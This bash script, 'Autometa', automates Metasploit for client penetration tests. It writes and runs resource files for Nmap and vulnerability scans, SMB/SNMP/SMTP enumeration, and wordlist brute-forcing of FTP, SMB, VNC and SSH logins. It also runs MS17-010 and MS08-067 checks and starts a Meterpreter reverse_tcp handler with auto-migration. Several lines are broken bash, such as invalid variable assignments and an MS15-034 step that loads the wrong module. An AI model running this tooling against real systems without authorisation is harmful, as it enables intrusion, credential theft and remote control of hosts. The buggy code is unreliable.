#!/bin/bash
start(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Updating The System & Intalling Dependencies"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#apt-get update && upgrade --force-yes &>/dev/null
clear
apt-get --yes --force-yes install toilet figlet 
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Autometa"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Tool Used For Automating Metasploit" 
echo "Version = beta"
echo "By Ramikan"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
read -r -p "Please Enter 1 for New Project or 2 for Current Project: " a
if [ "$a" == 1 ]; then
startup1
elif [ "$a" == 2 ]; then
startup2
else
echo " Type 1 or 2 On Restart"
sleep 6
start
fi
}
#Starup options 1

startup1(){
read -r -p " 1.	Enter The Project Name (Client name):" company
mkdir $company
echo workspace -a $company >> $company/meta-work.rc
echo load nessus >> $company/meta-work.rc
echo load openvas >>$company/meta-work.rc
echo load wmap >>$company/meta-work.rc
echo load sqlmap >>$company/meta-work.rc
echo exit >> $company/meta-work.rc
#gnome-terminal -- msfconsole -q -r $company/meta-work.rc
msfconsole -q -r $company/meta-work.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Metasploit Workspace Created: "$company
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
read -r -p " 2.	Enter the IP file location: " host
read -r -p " 3.	Enter The Path of The Username File: " user
if [ "$user" == 0 ]; then
$user = /usr/share/metasploit-framework/data/john/wordlists/common_roots.txt
fi
read -r -p " 4.	Enter The Path of The Password File: " pass
if [ "$pass" == 0 ]; then
$pass = /usr/share/metasploit-framework/data/john/wordlists/password.lst
fi
#read -r -p " Enter the Username list:" user
#read -r -p " Enter the Password list:" pass
read -r -p " 4.	Enter your IP address: " ip
read -r -p " 5.	Enter MSF-Handler port no: " port
read -r -p " 6.	Enter the Nessus server IP: " nessusip
#Starting postgresql
service postgresql start
set threads 15
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Basic Configuration Setup Done"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
Sleep 5
main
}

#Starup options 2

startup2(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Current Project Folders"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
ls -d */
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Choose Project Folders"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
read -r -p " Please	Enter The Old Project Name (Client name): " company1
#gnome-terminal -- msfconsole -q -r $company1/meta-work.rc
msfconsole -q -r $company1/meta-work.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Current Project/workspace is" $company1
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#Home Page

main(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  Info Gathering & Scanning"
echo "2.  Enumeration"
echo "3.  Hanging Fruit Attacks"
echo "4.  Web Attack(Disabled)"
echo "5.  Voip Attack(Disabled)"
echo "6.  Exploit Create(Disabled)"
echo "7.  MSFconsole"
echo "8.  Open Multihandler"
echo "9.  List Vuln"
echo "10. Exit"
echo
echo -n "Choice: "
read choice

case $choice in
     1) home;;
     2) home1;;
     3) home2;;
     4) home3;;
     5) home4;;
     6) home5;;
     7) console;;
     8) handler;;
     9) vuln;;
    10) close;;
esac
}

#==================================================================================================================
#Information Gathering & Scanning
#==================================================================================================================

home(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Information Gathering"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "1.  Nmap Scan(TCP&UDP)"
echo "2.  SMB Scan"
echo "3.  Other Scanners (Openvpn,Nessus,nexpose)"
echo "4.  Main Menu"
echo -n "Choice: "
read choice

case $choice in
     1) nscan;;
	 2) smb_scan;;
	 3) other_scan;;
	 4) main;;
esac
}

# Running NMAP SCAN

nscan(){
#Creating NMAP Checks
echo workspace $company >>$company/nmap.rc
echo db_nmap -F -Pn -sV -sT -O -A --exclude $ip -iL $host >>$company/nmap.rc
echo db_nmap -F -sU --exclude $ip -iL $host >>$company/nmap.rc
echo db_nmap -F -Pn -sV -sT -O --script vuln --exclude $ip -iL $host >>$company/nmap.rc
echo exit >>$company/nmap.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created nmap resource file under $company/nmap.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running Nmap Scanning For (TCP & UDP) and Nmap Vulnerability scan"
#gnome-terminal -- msfconsole -q -r $company/nmap.rc
msfconsole -q -r $company/nmap.rc
home
}

#Running SMB service Scan

smb_scan(){
#Creating SMB version Checks
echo workspace $company >>$company/smb-version-scan.rc
echo use auxiliary/scanner/smb/smb_version>>$company/smb-version-scan.rc
echo services -u -p 445 -R >>$company/smb-version-scan.rc
echo set threads 10 >>$company/smb-version-scan.rc
echo run >>$company/smb-version-scan.rc
echo exit >>$company/smb-version-scan.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMB-version resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SMB Version Scan Checks"
#gnome-terminal -- msfconsole -q -r $company/smb-version-scan.rc
msfconsole -q -r $company/smb-version-scan.rc
home
}

#Preparing other Scanners

other_scan(){
echo -e "\e[1;32m----------------------------------------------------------------------\e[00m"
figlet -f big "Other Scanners"
echo -e "\e[1;32m----------------------------------------------------------------------\e[00m"
echo "1.  Nessus Scan"
echo "2.  OpenVas Scan"
echo "3.  Back"
echo "4.  Menu"
echo -n "Choice: "
read choice

case $choice in
     1) nessus_scan;;
	 2) openvas_scan;;
	 3) home;;
     4) main;;
esac

}

# Nessus Scan Options

nessus_scan(){
clear
echo -e "\e[1;32m-------------------------------------------------------------------\e[00m"
figlet -f big "Nessus scanning Options"
echo -e "\e[1;32m-------------------------------------------------------------------\e[00m"
echo "1.  Run Nessus Scan"
echo "2.  Upload Nessus Report(only)"
echo "3.  Scan Status"
echo "4.  Back"
echo -n "Choice: "
read choice

case $choice in
     1) nessus;;
	 2) nessus_import;;
	 3) nessus_status;;
	 4) other_scan;;
esac
}
nessus(){

#Running Nessus scan

read -r -p " 1.	Enter The Nessus User Name:" nessususer
read -r -p " 2.	Enter The Nessus User Pass:" nessuspass
read -r -p " 3.	Enter The Nessus Server Port:" nessusport
echo workspace $company >>$company/nessus_scan.rc
echo load nessus >>$company/nessus_scan.rc
echo nessus_connect $nessususer:$nessuspass@$nessusip:$nessusport >>$company/nessus_scan.rc
echo nessus_db_scan_workspace ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66 Autometa $company $company >>$company/nessus_scan.rc
#echo exit >>$company/nessus_scan.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created nessus-Scanning resource file under $company/nessus_scan.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#gnome-terminal -- msfconsole -q -r $company/nessus_scan.rc
msfconsole -q -r $company/nessus_scan.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running Nessus Scan For" $company
nessus_scan
}

nessus_status(){

#Checking Nessus Scan Status

echo workspace $company >>$company/nessus_status.rc
echo load nessus >>$company/nessus_status.rc
echo nessus_scan_list >>$company/openvas_status.rc
#echo exit >>$company/nessus_status.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created nessus_status resource file under $company/nessus_status.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#gnome-terminal -- msfconsole -q -r $company/openvas_status.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Showing Nessus Scan status for" $company
msfconsole -q -r $company/nessus_status.rc
nessus_scan
}

nessus_import(){

#Uploading Nessus result

read -r -p " 1.	Enter The Nessus Scanner (xml) file location:" nessusreport
echo workspace $company >>$company/nessus_upload.rc
echo load nessus >>$company/nessus_upload.rc
echo db_import $nessusreport >>$company/nessus_upload.rc
echo exit >>$company/nessus_upload.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created nessus-upload resource file under $company/nessus_upload.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#gnome-terminal -- msfconsole -q -r $company/nessus_upload.rc
msfconsole -q -r $company/nessus_upload.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Uploading Nessus Scan Result to Metsploit workspace" $company
nessus_scan
}


# Openvas Scan Options

openvas_scan(){
clear
echo -e "\e[1;32m-------------------------------------------------------------------\e[00m"
figlet -f big "Openvas scanning Options"
echo -e "\e[1;32m-------------------------------------------------------------------\e[00m"
echo "1.  Run Openvas Scan"
echo "2.  Upload openvas Report(only)"
echo "3.  Scan Status"
echo "4.  Back"
echo -n "Choice: "
read choice

case $choice in
     1) openvas;;
	 2) openvas_import;;
	 3) openvas_status;;
	 4) other_scan;;
esac
}

openvas(){

#starting Openvas Scan

read -r -p " 1.	Enter The openvas User Name:" openvasuser
read -r -p " 2.	Enter The openvas User Pass:" openvasPass
read -r -p " 3.	Enter The openvas Server IP(172.0.0.1):" openvasip
if [ "$openvasip" == 0 ]; then
$openvasip = 172.0.0.1
fi
read -r -p " 4.	Enter The openvas Server Port(9390):" openvasport
if [ "$openvasport" == 0 ]; then
$openvasport = 9390
fi
echo workspace $company >>$company/openvas_scan.rc
echo openvas-start >>$company/openvas_scan.rc
echo load openvas >>$company/openvas_scan.rc
echo openvas_connect $openvasuser $openvasPass $openvasip $openvasport >>$company/openvas_scan.rc
#echo exit >>$company/openvas_scan.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created Openvas Scan resource file under $company/openvas_scan.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Launching Openvas Scan Setup for" $company
#gnome-terminal -- msfconsole -q -r $company/openvas_scan.rc
msfconsole -q -r $company/openvas_scan.rc
openvas_scan
}

openvas_import(){

#Import openvas Report

echo workspace $company >>$company/openvas_import.rc
echo load openvas >>$company/openvas_scan.rc
echo db_import $openvasfile >>$company/openvas_import.rc
echo exit >>$company/openvas_import.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created Openvas Scan upload file under $company/openvas_import.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Launching Openvas Scan Setup for" $company
#gnome-terminal -- msfconsole -q -r $company/openvas_import.rc
msfconsole -q -r $company/openvas_import.rc
openvas_scan
}

openvas_status(){

#Checking openvas_status Scan Status

echo workspace $company >>$company/openvas_status.rc
echo load openvas >>$company/openvas_status.rc
echo OpenVAS list of tasks >>$company/openvas_status.rc
echo exit >>$company/openvas_status.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created Openvas-status resource file under $company/openvas_status.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#gnome-terminal -- msfconsole -q -r $company/openvas_status.rc
msfconsole -q -r $company/openvas_status.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Showing Openvas Scan status for" $company
openvas_scan
}

#==================================================================================================================
# Enumeration
#==================================================================================================================
home1(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Enumeration"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  SMB"
echo "2.  SNMP"
echo "3.  SMTP"
echo "4.  Main Menu"

echo
echo -n "Choice: "
read choice

case $choice in
     1) smb_enum;;
     2) snmp_enum;;
     3) smtp_enum;;
     4) main;;
esac
}

#Running SMB enum

smb_enum(){
read -r -p " Enter SMB Domain:" smbdomain
if [ "$smbdomain" == 0 ]; then
$smbdomain = workgroup
fi
read -r -p " Enter SMB Username:" smbuser
if [ "$smbuser" == 0 ]; then
$smbuser = administrator
fi
read -r -p " Enter SMB Password:" smbpass
if [ "$smbpass" == 0 ]; then
$smbpass = 'Pa$$word1'
fi

read -r -p " Enter SMB Pipe name:" smbpipe
if [ "$smbpass" == 0 ]; then
$smbpipe = 'netlogon, lsarpc, samr, browser, epmapper, srvsvc, wkssvc, guest, home, user, usr'
fi
#Creating SMB Share enum

echo workspace $company >>$company/smb-share-enum.rc
echo use auxiliary/scanner/smb/smb_enumshares>>$company/smb-share-enum.rc
echo services -u -p 445 -R >>$company/smb-share-enum.rc
echo set SMBDomain $smbdomain >>$company/smb-share-enum.rc
echo set SMBUser $smbuser >>$company/smb-share-enum.rc
echo set SMBPass $smbpass >>$company/smb-share-enum.rc
echo set threads 10 >>$company/smb-share-enum.rc
echo run >>$company/smb-share-enum.rc
echo exit >>$company/smb-share-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMB-share resource file under Folder $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"


#Creating SMB User enum

echo workspace $company >>$company/smb-user-enum.rc
echo use auxiliary/scanner/smb/smb_enumusers>>$company/smb-user-enum.rc
echo services -u -p 445 -R >>$company/smb-user-enum.rc
echo set SMBDomain $smbdomain >>$company/smb-user-enum.rc
echo set SMBUser $smbuser >>$company/smb-user-enum.rc
echo set SMBPass $smbpass >>$company/smb-user-enum.rc
echo set threads 10 >>$company/smb-user-enum.rc
echo run >>$company/smb-user-enum.rc
echo exit >>$company/smb-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMB-user resource file under Folder $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"

#Running SMB PIPE Enum

echo workspace $company >>$company/smb-pipe-enum.rc
echo use auxiliary/scanner/smb/pipe_auditor >>$company/smb-pipe-enum.rc
echo services -u -p 445 -R >>$company/smb-pipe-enum.rc
echo set SMBDomain $smbdomain >>$company/smb-pipe-enum.rc
echo set SMBUser $smbuser >>$company/smb-pipe-enum.rc
echo set SMBPass $smbpass >>$company/smb-pipe-enum.rc
echo set threads 10 >>$company/smb-pipe-enum.rc
echo run >>$company/smb-pipe-enum.rc
#echo exit >>$company/smb-pipe-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created smb-pipe-enum.rc resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SMB Pipe Name Checks"
#gnome-terminal -- msfconsole -q -r $company/smb-user-enum.rc
msfconsole -q -r $company/smb-pipe-enum.rc
echo "Running SMB Share Enumeration"
#gnome-terminal -- msfconsole -q -r $company/smb-user-enum.rc
msfconsole -q -r $company/smb-share-enum.rc
echo "Running SMB User Enumeration"
#gnome-terminal -- msfconsole -q -r $company/smb-user-enum.rc
msfconsole -q -r $company/smb-user-enum.rc
home1
}

#Running SNMP Enum
snmp_enum(){
echo workspace $company >>$company/snmp-comm-enum.rc
echo use auxiliary/scanner/snmp/snmp_login >>$company/snmp-comm-enum.rc
echo services -u -p 161 -R >>$company/snmp-comm-enum.rc
echo set VERSION all >>$company/snmp-comm-enum.rc
echo set threads 10 >>$company/snmp-comm-enum.rc
echo run >>$company/snmp-comm-enum.rc
echo exit >>$company/snmp-comm-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SNMP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP Checks"
msfconsole -q -r $company/snmp-comm-enum.rc
home1
}

#Running SMTP Enum

smtp_enum(){
echo workspace $company >>$company/smtp-user-enum.rc
echo use auxiliary/scanner/smtp/smtp_enum >>$company/smtp-user-enum.rc
echo services -u -p 25 -R >>$company/smtp-user-enum.rc
echo set USER_FILE $user >>$company/smtp-user-enum.rc
echo set UNIXONLY false >>$company/smtp-user-enum.rc
echo set threads 10 >>$company/smtp-user-enum.rc
echo run >>$company/smtp-user-enum.rc
echo exit >>$company/smtp-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SMTP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SMTP Checks"
msfconsole -q -r $company/smtp-user-enum.rc
home1
}


#==================================================================================================================
# Hanging Fruit Attacks
#==================================================================================================================
home2(){
clear
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo
echo "1.  Common Attack"
echo "2.  SNMP Attack"
echo "3.  SMB Attack"
echo "4.  VNC Attack"
echo "5.  SSH Attack"
echo "6.  FTP Attack"
echo "7.  MSFconsole"
echo "8.  Open Multihandler"
echo "9.  Main Menu"
echo -n "Choice: "
read choice

case $choice in
     1) common_attack;;
     2) snmp_scan;;
     3) smb_check;;
     4) vnc_scan;;
     5) ssh_scan;;
	 6) ftp_scan;;
     7) console;;
     8) handler;;
     9) main;;
esac
}
#Common attacks

common_attack(){

# MS17-010-Ethernalblue-check

echo workspace $company >>$company/smb_ms17_010.rc
echo use auxiliary/scanner/smb/smb_ms17_010>>$company/smb_ms17_010.rc
echo services -u -p 445 -R >>$company/smb_ms17_010.rc
echo set SMBDomain $smbdomain >>$company/smb_ms17_010.rc
echo set SMBUser $smbuser >>$company/smb_ms17_010.rc
echo set SMBPass $smbpass >>$company/smb_ms17_010.rc
echo set threads 10 >>$company/smb_ms17_010.rc
echo run >>$company/smb_ms17_010.rc

# ms08_067_netapi-check

echo workspace $company >>$company/ms08_067_netapi.rc
echo use exploit/windows/smb/ms08_067_netapi>>$company/ms08_067_netapi.rc
echo services -u -p 445 -R >>$company/ms08_067_netapi.rc
echo set SMBDomain $smbdomain >>$company/ms08_067_netapi.rc
echo set SMBUser $smbuser >>$company/ms08_067_netapi.rc
echo set SMBPass $smbpass >>$company/ms08_067_netapi.rc
echo set SMBPIPE $smbpipe >>$company/ms08_067_netapi.rc
echo set threads 10 >>$company/ms08_067_netapi.rc
echo check >>$company/ms08_067_netapi.rc
#echo run >>$company/ms08_067_netapi.rc
#echo exit >>$company/ms08_067_netapi.rc

# use ms15_034 HTTP.SYS
echo workspace $company >>$company/ms15_034.rc
echo use auxiliary/scanner/smb/smb_ms17_010>>$company/ms15_034.rc
echo services -u -p 443 -R >>$company/ms15_034.rc
echo set threads 10 >>$company/ms15_034.rc
echo run >>$company/ms15_034.rc

echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "MS15_034 HTTP.SYS-check"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#gnome-terminal -- msfconsole -r $company/ms15_034.rc
msfconsole -q -r $company/ms15_034.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "MS17-010-Ethernalblue-check"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#gnome-terminal -- msfconsole -r $company/smb_ms17_010.rc
msfconsole -q -r $company/smb_ms17_010.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "ms08_067_netapi-check"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
#gnome-terminal -- msfconsole -r $company/ms08_067_netapi.rc
msfconsole -q -r $company/ms08_067_netapi.rc
home2
}
#

#FTP Attack
ftp_scan(){
#Creating FTP Checks
echo workspace $company >>$company/ftp-anon.rc
echo workspace $company >>$company/ftp-brute.rc
echo use auxiliary/scanner/ftp/anonymous >>$company/ftp-anon.rc
echo use auxiliary/scanner/ftp/ftp_login >>$company/ftp-brute.rc
echo services -u -p 21 -R >>$company/ftp-anon.rc
echo services -u -p 21 -R >>$company/ftp-brute.rc
echo set threads 10 >>$company/ftp-anon.rc
echo set threads 10 >>$company/ftp-brute.rc
echo set USER_FILE $user >>$company/ftp-brute.rc
echo set PASS_FILE $pass >>$company/ftp-brute.rc
echo run >>$company/ftp-brute.rc
echo run >>$company/ftp-anon.rc
echo exit >>$company/ftp-brute.rc
echo exit >>$company/ftp-anon.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created ftp resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running FTP Checks"
msfconsole -q -r $company/ftp-brute.rc
msfconsole -q -r $company/ftp-anon.rc
#gnome-terminal -- msfconsole -r $company/ftp-brute.rc
#gnome-terminal -- msfconsole -r $company/ftp-anon.rc
home2
}

#Running SNMP Enum
snmp_scan(){
read -r -p " Enter Community string name:" community
if [ "$community" == 0 ]; then
$community = public
fi
echo workspace $company >>$company/snmp-user-enum.rc
echo use auxiliary/scanner/snmp/snmp_enumusers >>$company/snmp-user-enum.rc
echo services -u -p 161 -R >>$company/snmp-user-enum.rc
echo set VERSION 2c >>$company/snmp-user-enum.rc
echo set threads 10 >>$company/snmp-user-enum.rc
echo run >>$company/snmp-user-enum.rc
echo exit >>$company/snmp-user-enum.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SNMP resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Running SNMP User-Enum"
msfconsole -q -r $company/snmp-user-enum.rc
#gnome-terminal -- msfconsole -r $company/snmp-user-enum.rc
home2
}

# Running SMB Checks
smb_check(){
#Creating SMB Checks
echo workspace $company >>$company/smb_login.rc
echo use auxiliary/scanner/smb/smb_login >>$company/smb_login.rc
echo services -u -p 445 -R >>$company/smb_login.rc
echo set threads 10 >>$company/smb_login.rc
echo set USER_FILE $user >>$company/smb_login.rc
echo set PASS_FILE $pass >>$company/smb_login.rc
echo set record_guest yes >>$company/smb_login.rc
echo run >>$company/smb_login.rc
echo exit >>$company/smb_login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created smb resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running SMB checks"
#gnome-terminal -- msfconsole -q -r $company/smb_login.rc
msfconsole -q -r $company/smb_login.rc
home2
}

# Running VNC Checks
vnc_scan(){
#Creating VNC Checks
echo workspace $company >>$company/vnc-login.rc
echo use auxiliary/scanner/vnc/vnc_login >>$company/vnc-login.rc
echo services -u -p 5900 -R >>$company/vnc-login.rc
echo set threads 10 >>$company/vnc-login.rc
echo set DB_ALL_CREDS true >>$company/vnc-login.rc
echo set DB_ALL_USERS true >>$company/vnc-login.rc
echo set DB_ALL_PASS true >>$company/vnc-login.rc
echo set USER_FILE $user >>$company/vnc-login.rc
echo run >>$company/vnc-login.rc
echo exit >>$company/vnc-login.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created VNC resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running VNC checks"
#gnome-terminal -- msfconsole -q -r $company/vnc-login.rc
msfconsole -q -r $company/vnc-login.rc
home2
}

# Running SSH Checks
ssh_scan(){
#Creating SSH Checks
echo workspace $company >>$company/ssh.rc
echo use auxiliary/scanner/ssh/ssh_login >>$company/ssh.rc
echo services -u -p 22 -R >>$company/ssh.rc
echo set threads 10 >>$company/ssh.rc
echo set DB_ALL_CREDS true >>$company/ssh.rc
echo set DB_ALL_USERS true >>$company/ssh.rc
echo set DB_ALL_PASS true >>$company/ssh.rc
echo set USER_FILE $user >>$company/ssh.rc
echo run >>$company/ssh.rc
echo exit >>$company/ssh.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created SSH resource file under $company/"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running SSH checks"
#gnome-terminal -- msfconsole -q -r $company/ssh.rc
msfconsole -q -r $company/ssh.rc
home1
}


#home Page
home3(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home4(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home5(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home6(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home7(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#home Page
home8(){
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
figlet -f big "Menu"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
main
}

#msfconsole Current Workspace
console(){
echo workspace $company >>$company/console.rc
echo " Opening your MSF workspace"
echo "To close & Jump To Menu Type 'exit'"
msfconsole -q -r $company/console.rc
main
}

# Listing all Nessus vuln
vuln(){
#Creating Nessus vul result
echo workspace $company >>$company/vuln-list.rc
echo load nessus >>$company/vuln-list.rc 
echo vulns $company/vuln-list.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo "Created Vulnerability-List resource file under $company/vuln-list.rc"
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " List of vulnerabilities found for project" $company
#gnome-terminal -- msfconsole -q -r $company/vuln-list.rc
msfconsole -q -r $company/vuln-list.rc
main
}

#MSF Multi Handler
handler(){

echo workspace $company >>$company/multihandler.rc
echo use exploit/multi/handler >>$company/multihandler.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >>$company/multihandler.rc
echo set LHOST $ip >>$company/multihandler.rc
echo set LPORT $port >>$company/multihandler.rc
echo set ExitOnSession false >>$company/multihandler.rc
echo set AutoRunScript post/windows/manage/smart_migrate >>$company/multihandler.rc
echo exploit -j -z >>$company/multihandler.rc
echo -e "\e[1;32m----------------------------------------------------------\e[00m"
echo " Running MSF Multi handler at &ip &port checks"
#gnome-terminal -- msfconsole -q -r $company/multihandler.rc
msfconsole -q -r $company/multihandler.rc
main
}

#Closing the Tool
close(){
exit
}
start
